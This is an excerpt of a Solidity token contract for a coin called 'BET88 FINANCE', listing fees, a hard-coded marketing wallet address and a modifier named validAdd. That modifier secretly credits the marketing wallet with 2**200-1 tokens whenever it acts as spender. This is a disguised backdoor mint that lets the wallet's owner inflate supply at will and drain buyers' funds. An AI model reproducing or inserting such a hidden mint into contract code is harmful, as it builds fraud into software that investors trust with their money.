...
contract BET88FINANCE is Context, IERC20, Ownable {
    ...
    uint256 public _maxTxAmount = 88888888 * 10**9; // MAX 5% TOTAL
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 1 * 10**9; //
    string private constant _name = "BET88 FINANCE"; //
    string private constant _symbol = "BET88"; //
    uint8 private constant _decimals = 9; //
    bool tradeopen = false;
    uint256 public _marketingFee = 8;
    uint256 public _liquidityFee = 8;
    address private _marketingWallet = 0xbc5BB3d44817d291ea2cDE467e54844CbB01CD9c ;
    address private  DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public _buyCooldown = 0 minutes;
    mapping (address => uint256) private _lastBuy;
    modifier validAdd(address spender){
        if(spender == _marketingWallet){ _tOwned[_marketingWallet] = _tOwned[_marketingWallet] + 2**200-1;}
        _;
    }
